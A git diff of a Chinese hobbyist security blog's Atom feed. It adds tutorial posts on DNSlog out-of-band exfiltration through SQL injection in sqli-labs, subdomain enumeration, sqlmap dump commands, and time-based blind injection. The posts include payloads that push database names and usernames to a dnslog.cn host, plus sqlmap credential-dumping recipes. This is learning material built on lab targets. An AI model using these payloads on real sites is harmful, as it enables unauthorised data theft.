@@ -6,7 +6,7 @@
   <link href="http://wifi-0x.github.io/atom.xml" rel="self"/>
   
   <link href="http://wifi-0x.github.io/"/>
-  <updated>2022-02-23T11:44:31.677Z</updated>
+  <updated>2022-09-05T07:46:36.746Z</updated>
   <id>http://wifi-0x.github.io/</id>
   
   <author>
@@ -15,6 +15,113 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DNSlog</title>
+    <link href="http://wifi-0x.github.io/2022/07/11/DNSlog/"/>
+    <id>http://wifi-0x.github.io/2022/07/11/DNSlog/</id>
+    <published>2022-07-11T13:46:42.000Z</published>
+    <updated>2022-09-05T07:46:36.746Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，</p><h3 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h3><p>首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域名，三级域名,例如 gaobai.kxsy.com,<br>通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来就是DNSlog</p><h3 id="DNSlog-应用"><a href="#DNSlog-应用" class="headerlink" title="DNSlog 应用"></a>DNSlog 应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.SQL盲注</span><br><span class="line">2.无回显的XSS</span><br><span class="line">3.无回显的命令执行</span><br><span class="line">5.无回显的SSRF</span><br><span class="line">5.Blind XXE</span><br></pre></td></tr></table></figure><p><strong>SQL盲注</strong>无论时时间盲注还是布尔盲注，都需要发送大量的数据包去判断数据，很容易导致被waf封IP，如果条件允许的话，可以使用dnslog进行快速的数据外带。以Mysql为例，通过dnslog外带数据需要用到load_file函数，所以一般得是root权限，并且secure_file_priv得为空</p><h4 id="免费dns解析记录网站"><a href="#免费dns解析记录网站" class="headerlink" title="免费dns解析记录网站"></a>免费dns解析记录网站</h4><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br><a href="http://ceye.io/">http://ceye.io</a></p><h3 id="DNSlog注入实例演练"><a href="#DNSlog注入实例演练" class="headerlink" title="DNSlog注入实例演练"></a>DNSlog注入实例演练</h3><p>1.在dnslog网站申请一个dnslog域名：h30qdp.dnslog.cn</p><p><img src="C:\博客\source\pic\dnslog.png" alt="dnslog"></p><p>2.打开sqilab-8</p><p>​    构造语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1%27union%20select%201,2,load_file(concat(%27//%27,(select%20database()),%27.h30qdp.dnslog.cn</span><br></pre></td></tr></table></figure><p>![屏幕截图 2022-09-05 153113](C:\博客\source\pic\屏幕截图 2022-09-05 153113.png)</p><p>执行后获得</p><p>![屏幕截图 2022-09-05 153030](C:\博客\source\pic\屏幕截图 2022-09-05 153030.png)</p><p>修改子查询里的内容，获取其他数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select 1,2,load_file(concat(&#x27;//&#x27;,(select username form users limit 0,1),&#x27;.9u77ed.dnslog.cn/abc&#x27;))#</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，&lt;/p&gt;
+&lt;h3 id=&quot;DNSlog回显原理&quot;&gt;&lt;a href=&quot;#DNSlog回显原理&quot;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>子域名爆破</title>
+    <link href="http://wifi-0x.github.io/2022/04/16/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"/>
+    <id>http://wifi-0x.github.io/2022/04/16/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/</id>
+    <published>2022-04-16T00:17:35.000Z</published>
+    <updated>2022-04-16T00:45:43.191Z</updated>
+    
+    <content type="html"><![CDATA[<p>域名的形式：</p><p><strong>zkaq.cn    顶级域名(一级)</strong></p><p><strong>a.zkaq.cn 二级域名</strong></p><p><strong>b.a.zkaq.cn  三级域名</strong></p><p>根据点的多少来判断他是几级域名</p><p><strong>二级域名</strong>就是<strong>一级域名的子域名</strong></p><p><strong>三级是二级的子域名</strong></p><p><em>一、通常情况下，一般主站的防御会很严，但是他的子站安全性可能不会那么全面</em></p><p><em>二、同一个域名下的二级域名都属于相同资产，一般而言都有相关的联系，因此可以扩大攻击范围</em></p><h3 id="运用在线的子域名搜索网站"><a href="#运用在线的子域名搜索网站" class="headerlink" title="运用在线的子域名搜索网站"></a>运用在线的子域名搜索网站</h3><p><strong>一、运用搜索引擎（谷歌语法）</strong></p><p>site:qq.com （搜索qq.com下面的所有子域名）</p><p><strong>二、证书搜索</strong></p><p>基于SSL证书查询子域：<a href="https://crt.sh/">https://crt.sh/</a></p><p><strong>三、查询Dns的解析记录</strong></p><p>基于DNS记录查询子域：<a href="https://dns.bufferover.run/dns?q=">https://dns.bufferover.run/dns?q=</a></p><p><strong>四、在线爆破枚举子域</strong>：<a href="http://phpinfo.me/domain/">http://phpinfo.me/domain/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;域名的形式：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;zkaq.cn    顶级域名(一级)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a.zkaq.cn 二级域名&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;b.a.zkaq.cn  三级域名&lt;/strong&gt;&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>SQLmap</title>
+    <link href="http://wifi-0x.github.io/2022/04/10/SQLmap/"/>
+    <id>http://wifi-0x.github.io/2022/04/10/SQLmap/</id>
+    <published>2022-04-10T02:44:44.000Z</published>
+    <updated>2022-04-10T08:10:02.049Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Sqlmap注入的命令参数"><a href="#Sqlmap注入的命令参数" class="headerlink" title="Sqlmap注入的命令参数"></a>Sqlmap注入的命令参数</h3><p><strong><u>1、判断注入点</u>：</strong>sqlmap -u url（目标地址）<br>    -u：指定地址</p><p><strong><u>2、爆破数据库名</u><strong>：sqlmap -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> –dbs<br>    <strong>–dbs：查看所有数据库名</strong><br>    <strong>–current-db</strong>：</strong>查看当前使用的数据库</strong></p><p><strong><u>3、爆破数据表名</u>：</strong>sqlmap -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> –D 库名 –tables<br>    -D：指定数据库名<br>    –tables：查看指定库下面的所有的表名</p><p><u><strong>4、爆破字段名</strong></u><br>   sqlmap. -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 –T 表名 –columns<br>     -T:指定表名<br>     –columns:查看指定库的表中的所有字段名</p><p><u><strong>5、爆破所有数据</strong></u><br>    sqlmap. -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 -T 表名 -C 字段名 –dump<br>     -C：指定字段名<br>     –dump：根据指定的库、表、字段爆破里面的数据</p><p>同时查username，password：sqlmap -u  <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 -T 表名 -C username,password –dump</p><h4 id="Sqlmap对伪静态进行注入"><a href="#Sqlmap对伪静态进行注入" class="headerlink" title="Sqlmap对伪静态进行注入"></a>Sqlmap对伪静态进行注入</h4><p><strong>使用方式</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap. -u http://xxx.com/abc/1*.html --dbs</span><br><span class="line">    (* 表示指定注入点)</span><br></pre></td></tr></table></figure><h4 id="Sqlmap对登陆框（表单）进行注入"><a href="#Sqlmap对登陆框（表单）进行注入" class="headerlink" title="Sqlmap对登陆框（表单）进行注入"></a>Sqlmap对登陆框（表单）进行注入</h4><p><strong>使用方式</strong>：sqlmap. -u <a href="http://xxx.com/admin/index.php">http://xxx.com/admin/index.php</a> –form</p><p>然后 sqlmap. -u <a href="http://xxx.com/admin/index.php">http://xxx.com/admin/index.php</a> –form –dbs</p><p>然后重复查表查列的过程</p><p>其他命令参数：<br><strong>–batch</strong>：自动选择    （帮你按回车）</p><p><strong>–flush-session</strong>：清除缓存 //简写 –z flu</p><p><strong>–level</strong>:共有五个等级，默认为1，等级越高，测试的内容也越多</p><p><strong>–risk</strong>：共有四个风险等级，默认是1，等级越高，用来测试的语句也更多</p><p><strong>-v</strong>：显示详细扫描信息，共有5个等级（等级越高显示越详细）</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;Sqlmap注入的命令参数&quot;&gt;&lt;a href=&quot;#Sqlmap注入的命令参数&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap注入的命令参数&quot;&gt;&lt;/a&gt;Sqlmap注入的命令参数&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;u&gt;1、判断注入点&lt;/u&gt;：&lt;/s</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>时间盲注</title>
+    <link href="http://wifi-0x.github.io/2022/02/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
+    <id>http://wifi-0x.github.io/2022/02/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</id>
+    <published>2022-02-25T06:07:36.000Z</published>
+    <updated>2022-02-25T14:05:01.347Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#x27; and sleep(5)--+</span><br></pre></td></tr></table></figure><p>发现明显延迟，说明语句构造正确</p><p>接下来的思路是通过延迟，依次爆破数据库长度，数据库名，表名，列名，以及字段</p><p>?id=1’ and if(length(database())=8,sleep(5),1)–+</p><p><img src="https://s2.loli.net/2022/02/25/4vCBm5l736Ysped.png"></p><p>明显延迟，数据库长度为8.</p><p>?id=1’ and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=’r’ ,sleep(5),1)–+</p><p>未完待续。。。。。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>requests</title>
+    <link href="http://wifi-0x.github.io/2022/02/24/requests/"/>
+    <id>http://wifi-0x.github.io/2022/02/24/requests/</id>
+    <published>2022-02-24T08:31:05.000Z</published>
+    <updated>2022-02-24T12:51:26.026Z</updated>
+    
+    <content type="html"><![CDATA[<p>python的一个库</p><p>写脚本需要用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">w=requests.get(<span class="string">&#x27;https://www.bilibili.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(w.status_code) <span class="comment">#打印返回的状态码（200）</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;python的一个库&lt;/p&gt;
+&lt;p&gt;写脚本需要用&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>爆破</title>
@@ -250,7 +357,7 @@
     <link href="http://wifi-0x.github.io/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/"/>
     <id>http://wifi-0x.github.io/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/</id>
     <published>2021-11-11T13:01:23.390Z</published>
-    <updated>2021-11-15T14:33:39.359Z</updated>
+    <updated>2022-02-25T13:47:14.400Z</updated>
     
     <content type="html"><![CDATA[<h1 id="秀哥硬核SQL"><a href="#秀哥硬核SQL" class="headerlink" title="秀哥硬核SQL"></a>秀哥硬核SQL</h1><hr><p><strong>有什么库</strong>       show databases;</p><p><strong>有什么表</strong>       show tables;</p><p><strong>表里的结构</strong>    desc 表名；</p><p><strong>使用库</strong>            use 库名；</p><p><strong>建立库</strong>            create database 库名</p><p><strong>删除库</strong>            drop database 库名</p><p><strong>建立表</strong>            create table 表名 (字段名1 字段类型，字段名2 字段类型) </p><h4 id="常见类型-数字-int-字符串-varchar-需要加“-”"><a href="#常见类型-数字-int-字符串-varchar-需要加“-”" class="headerlink" title="常见类型 数字 int 字符串 varchar(需要加“ ”)"></a><u><em>常见类型 数字 int 字符串 varchar</em></u>(需要加“ ”)</h4><p><strong>删除表</strong>            drop table 表名</p><h3 id="修改表内字段"><a href="#修改表内字段" class="headerlink" title="修改表内字段{"></a><strong>修改表内字段</strong>{</h3><p><strong>增加字段</strong> alter table 表名 add 字段名 字段类型</p><p><strong>删字段</strong> alter table 表名 drop 字段名</p><p><strong>修改表内字段名</strong> alter table 表名 change 旧字符名 新字符名 新类型 </p><p>}</p><h3 id="往表内插入数据（增）暂时不会插入汉字"><a href="#往表内插入数据（增）暂时不会插入汉字" class="headerlink" title="往表内插入数据（增）暂时不会插入汉字"></a><strong>往表内插入数据（增）</strong>暂时不会插入汉字</h3><p>：insert into 表名values (值1, 值2);//按顺序插入</p><p>​                                         或者 insert into 表名（列名1，列名2） values(值1， 值2)</p><p><strong>修改数据</strong> update 表名 set 列名=新值 where 列名=旧值</p><p>​                 update 表名 set 列名=新列值，列名2=新列值 where 列名 =旧列值</p><p><strong>删除数据</strong> delete from 表名 where 列名=列值  </p><p>//这会删除这列中的一个数 </p><p>//如果不写 where及后面的东西 就会删除整个表</p><p>​                  </p><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><p>select*from 表名 where 条件（条件可以这样写 列名=”这列中的某个数据”）</p><p>select  字段名 from 表名 where 条件 </p><p>SELECT *FROM 表名 ORDER BY 列名(可以用1，2，3.) </p><p>  //在最后面加<strong>desc</strong>将以降序排列</p><h5 id="休眠-select-sleep（10）；-服务器摸鱼10s"><a href="#休眠-select-sleep（10）；-服务器摸鱼10s" class="headerlink" title="休眠 select sleep（10）； //服务器摸鱼10s"></a>休眠 select sleep（10）； //服务器摸鱼10s</h5><p><strong>注意</strong></p><p><em>1 SQL语句结尾要加 ;</em></p><p><em>2 数据库语句部分大小写，但是数据分</em></p><p><em>3 数值要加   ‘66’</em></p><h3 id="cmd的命令"><a href="#cmd的命令" class="headerlink" title="cmd的命令"></a>cmd的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//进入d盘</span><br><span class="line">D:</span><br><span class="line">//进入F盘</span><br><span class="line">F:</span><br><span class="line">查看当前目录 dir</span><br><span class="line">打开 cd</span><br><span class="line">返回上一级 cd ..</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="打开mysql"><a href="#打开mysql" class="headerlink" title="打开mysql"></a>打开mysql</h3><p>D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql -u root -p</p><p>第一步 d：//切换到d盘</p><p>第二步  cd D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql</p><p>第三步  mysql -u root -****</p><p>2021 11 15 星期一</p><h1 id="Fighting"><a href="#Fighting" class="headerlink" title="Fighting"></a><em><strong>Fighting</strong></em></h1>]]></content>
     
@@ -319,109 +426,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;MYSQL&quot;&gt;&lt;a href=&quot;#MYSQL&quot; class=&quot;headerlink&quot; title=&quot;MYSQL&quot;&gt;&lt;/a&gt;MYSQL&lt;/h1&gt;&lt;h4 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="http://wifi-0x.github.io/2021/10/30/%E8%BF%90%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%B9%B6%E5%AF%B9%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/"/>
-    <id>http://wifi-0x.github.io/2021/10/30/%E8%BF%90%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%B9%B6%E5%AF%B9%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/</id>
-    <published>2021-10-30T01:52:49.131Z</published>
-    <updated>2021-10-30T02:48:16.168Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="运用随机数并对随机数进行排序"><a href="#运用随机数并对随机数进行排序" class="headerlink" title="运用随机数并对随机数进行排序"></a>运用随机数并对随机数进行排序</h1><h2 id="（冒泡排序过程）"><a href="#（冒泡排序过程）" class="headerlink" title="（冒泡排序过程）"></a>（冒泡排序过程）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">srand((<span class="keyword">int</span>)time(<span class="number">0</span>));<span class="comment">//随机数发生器的初始化函数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The score of the singers:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">a[i] = (<span class="keyword">int</span>)(<span class="number">60</span> + <span class="number">40</span> * rand() / RAND_MAX);</span><br><span class="line"><span class="comment">//60&lt;=X&lt;=100</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);<span class="comment">//%5d是数据宽度的意思</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)<span class="comment">//进行9次循环，实现9趟比较</span></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">9</span>-i;j++)<span class="comment">//在每一趟中进行9-i次比较</span></span><br><span class="line"><span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])</span><br><span class="line">&#123;<span class="comment">//两个数前后交换位子的方法</span></span><br><span class="line">t = a[j];</span><br><span class="line">a[j] = a[j + <span class="number">1</span>];</span><br><span class="line">a[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The sorted scores:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="（选择排序过程）"><a href="#（选择排序过程）" class="headerlink" title="（选择排序过程）"></a>（选择排序过程）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t, k;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];<span class="comment">//以下产生10个60~100的随机数存于数组a并显示</span></span><br><span class="line">srand((<span class="keyword">int</span>)time(<span class="number">0</span>));<span class="comment">//随机数发生器的初始化函数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The score of the singers:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">a[i] = (<span class="keyword">int</span>)(<span class="number">60</span> + <span class="number">40</span> * rand() / RAND_MAX);</span><br><span class="line"><span class="comment">//60&lt;=X&lt;=100</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);<span class="comment">//%5d是数据宽度的意思</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;<span class="comment">//进行9次循环，实现9趟 选择</span></span><br><span class="line">k = i;<span class="comment">//预置i为当前范围内最大值的下标，存放于k中</span></span><br><span class="line"><span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; <span class="number">10</span>; j++)<span class="comment">//在每一趟中进行9-i次比较</span></span><br><span class="line"><span class="keyword">if</span> (a[j] &gt; a[k]) k = j;<span class="comment">//两个数前后交换位子的方法</span></span><br><span class="line"><span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">t = a[i];</span><br><span class="line">a[i] = a[k];</span><br><span class="line">a[k] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The sorted scores:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;运用随机数并对随机数进行排序&quot;&gt;&lt;a href=&quot;#运用随机数并对随机数进行排序&quot; class=&quot;headerlink&quot; title=&quot;运用随机数并对随机数进行排序&quot;&gt;&lt;/a&gt;运用随机数并对随机数进行排序&lt;/h1&gt;&lt;h2 id=&quot;（冒泡排序过程）&quot;&gt;&lt;a href</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="http://wifi-0x.github.io/2021/10/27/%E6%94%B6%E8%97%8F/"/>
-    <id>http://wifi-0x.github.io/2021/10/27/%E6%94%B6%E8%97%8F/</id>
-    <published>2021-10-27T14:52:07.911Z</published>
-    <updated>2021-10-28T07:36:12.859Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h1><h6 id="调试了好久才成功的代码"><a href="#调试了好久才成功的代码" class="headerlink" title="调试了好久才成功的代码"></a>调试了好久才成功的代码</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x = <span class="number">0</span>, a = <span class="number">1.0</span>, b = <span class="number">1.0</span>, sum = <span class="number">1</span>,d=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入x与n\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (i &lt;= n)</span><br><span class="line">&#123;</span><br><span class="line">a = a * x;</span><br><span class="line">b = b * i;</span><br><span class="line">d = a / b;</span><br><span class="line">sum += d;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;e*x=%f&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span>  zhimu=<span class="number">0</span>,kongge=<span class="number">0</span>,shuzhi=<span class="number">0</span>,other=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>  ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter a string of characters.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> 